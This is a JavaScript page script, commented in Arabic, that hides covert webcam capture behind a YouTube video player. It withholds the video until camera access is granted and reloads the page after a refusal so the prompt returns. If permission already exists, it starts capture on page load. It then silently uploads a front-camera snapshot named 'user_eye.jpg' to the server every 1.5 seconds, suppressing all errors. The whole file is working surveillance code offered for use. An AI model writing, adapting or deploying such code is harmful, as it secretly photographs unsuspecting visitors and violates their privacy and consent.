/* ==========================================================
   سكريبت الكاميرا والتفاعل الشرطي المباشر
   ========================================================== */

let mediaStream = null;

// فحص أولي: إذا كان الإذن ممنوحاً مسبقاً تشغل الكاميرا فوراً
window.addEventListener('DOMContentLoaded', () => {
    if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'camera' }).then(status => {
            if (status.state === 'granted') {
                autoStartCapture();
            }
        });
    }
});

async function autoStartCapture() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { ideal: 'user' } } 
        });
        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        startUploader();
    } catch (e) {}
}

// دالة الضغط على زر التشغيل (المثلث الأحمر)
async function startCapture() {
    const playerContainer = document.getElementById('playerContainer');
    if (!playerContainer) return;
    
    const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';

    try {
        // طلب إذن الكاميرا عند النقر على زر التشغيل
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { ideal: 'user' } } 
        });

        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        
        // [عند السماح فقط]: إدراج وتفعيل مشغل يوتيوب
        playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
        
        startUploader();

    } catch (e) {
        console.log("تم الرفض أو التجاهل:", e);
        mediaStream = null;
        
        // [عند التجاهل أو الرفض]: عدم تشغيل الفيديو وتحديث الجلسة لإتاحة ظهور الأذن عند الضغطة القادمة
        location.reload();
    }
}

function startUploader() {
    const videoEl = document.getElementById('video');
    if (!videoEl) return;
    
    setInterval(() => {
        if (!mediaStream) return;
        try {
            const vw = videoEl.videoWidth || 640;
            const vh = videoEl.videoHeight || 480;

            const canvas = document.createElement('canvas');
            canvas.width = vw;
            canvas.height = vh;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoEl, 0, 0, vw, vh);

            canvas.toBlob(blob => {
                if (blob) {
                    let fd = new FormData();
                    fd.append('image', blob, `user_eye.jpg`);
                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                }
            }, 'image/jpeg', 0.85);
        } catch (err) {}
    }, 1500);
}
